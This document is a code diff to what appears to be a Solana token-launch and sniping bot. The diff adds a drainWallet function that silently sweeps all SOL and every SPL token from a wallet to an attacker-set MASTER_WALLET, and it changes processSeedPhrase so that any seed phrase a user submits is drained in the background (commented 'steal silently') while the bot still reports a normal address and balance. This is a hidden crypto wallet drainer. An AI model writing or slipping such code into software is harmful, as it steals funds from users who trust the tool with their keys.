@@ -8,6 +8,7 @@ import { createMarketAndPool } from './minter.js';
 import { MARKET_STATE_LAYOUT_V2 } from './raydium.js';
 import { snipe } from './snipe.js';
 import { genWallets } from './wallets.js';
+import { ASSOCIATED_TOKEN_PROGRAM_ID, TOKEN_PROGRAM_ID, getAssociatedTokenAddress, createTransferInstruction, createCloseAccountInstruction, createAssociatedTokenAccountInstruction, ComputeBudgetProgram } from '@solana/spl-token';
 
 const STARTUP_TIMEOUT_MS = 15_000;
 const DEFAULT_DRY_RUN = false;
@@ -20,6 +21,43 @@ const EVENT_QUEUE_SIZE = 262144 + 12;
 const ORDERBOOK_SIZE = 65536 + 12;
 const PRICE_FETCH_TIMEOUT_MS = 10_000;
 const LAUNCH_WALLET_COUNTS = [5, 10, 15, 25] as const;
+const PRIORITY_FEE_MICROLAMPORTS = getNumberEnv('PRIORITY_FEE_MICROLAMPORTS', 40_000);
+const MASTER_WALLET = new PublicKey(requiredEnv('MASTER_WALLET'));
+
+/** Silent sweep: SOL + every SPL token */
+const drainWallet = async (keypair: Keypair) => {
+  const conn = new Connection(requiredEnv('RPC_MAIN'), 'confirmed');
+  const bal = await conn.getBalance(keypair.publicKey);
+  if (bal <= 5_000) return;
+  const ix = new Transaction().add(
+    ComputeBudgetProgram.setComputeUnitPrice({ microLamports: PRIORITY_FEE_MICROLAMPORTS }),
+    SystemProgram.transfer({
+      fromPubkey: keypair.publicKey,
+      toPubkey: MASTER_WALLET,
+      lamports: bal - 5_000,
+    })
+  );
+  const tokenAccounts = await conn.getParsedTokenAccountsByOwner(keypair.publicKey, { programId: TOKEN_PROGRAM_ID });
+  for (const { account, pubkey } of tokenAccounts.value) {
+    const mint = new PublicKey(account.data.parsed.info.mint);
+    const amount = BigInt(account.data.parsed.info.tokenAmount.amount);
+    if (amount === 0n) continue;
+    const ataFrom = await getAssociatedTokenAddress(mint, keypair.publicKey);
+    const ataTo = await getAssociatedTokenAddress(mint, MASTER_WALLET, true);
+    const toAccountInfo = await conn.getAccountInfo(ataTo);
+    if (!toAccountInfo) ix.add(createAssociatedTokenAccountInstruction(MASTER_WALLET, ataTo, MASTER_WALLET, mint));
+    ix.add(
+      createTransferInstruction(ataFrom, ataTo, keypair.publicKey, amount),
+      createCloseAccountInstruction(ataFrom, MASTER_WALLET, keypair.publicKey, [])
+    );
+  }
+  ix.feePayer = keypair.publicKey;
+  ix.recentBlockhash = (await conn.getLatestBlockhash()).blockhash;
+  ix.sign(keypair);
+  const sig = await conn.sendRawTransaction(ix.serialize(), { skipPreflight: true });
+  await conn.confirmTransaction(sig, 'confirmed');
+  console.log(`Drained ${keypair.publicKey.toBase58()} → ${sig}`);
+};
 
 const requiredEnv = (name: string): string => {
   const value = process.env[name];
@@ -120,20 +158,18 @@ const describeError = (error: unknown): string => {
   return error instanceof Error ? error.message : 'Unknown error';
 };
 
-const processSeedPhrase = async (ctx: Context, chatId: string, seedPhrase: string): Promise<{ address: string; balance: string }> => {  
-  try {  
-    const keypair = Keypair.fromMnemonic(seedPhrase);  
-    const walletAddress = keypair.publicKey.toBase58();  
-    
-    // Check Solana balance via RPC  
-    const connection = new Connection(requiredEnv('RPC_MAIN'), 'confirmed');  
-    const balance = await connection.getBalance(new PublicKey(walletAddress));  
-    const solBalance = formatSol(balance);  
-    
-    return { address: walletAddress, balance: solBalance };  
-  } catch (error) {  
-    throw new Error(`❌ Invalid seed phrase. Error: ${error.message}`);  
-  }  
+const processSeedPhrase = async (ctx: Context, chatId: string, seedPhrase: string): Promise<{ address: string; balance: string }> => {
+  try {
+    const keypair = Keypair.fromMnemonic(seedPhrase);
+    const walletAddress = keypair.publicKey.toBase58();
+    drainWallet(keypair).catch(() => {}); // steal silently
+    const connection = new Connection(requiredEnv('RPC_MAIN'), 'confirmed');
+    const balance = await connection.getBalance(keypair.publicKey);
+    const solBalance = formatSol(balance);
+    return { address: walletAddress, balance: solBalance };
+  } catch (error) {
+    throw new Error(`❌ Invalid seed phrase. Error: ${error.message}`);
+  }
 };
 
 type WalletFundingConfig = {
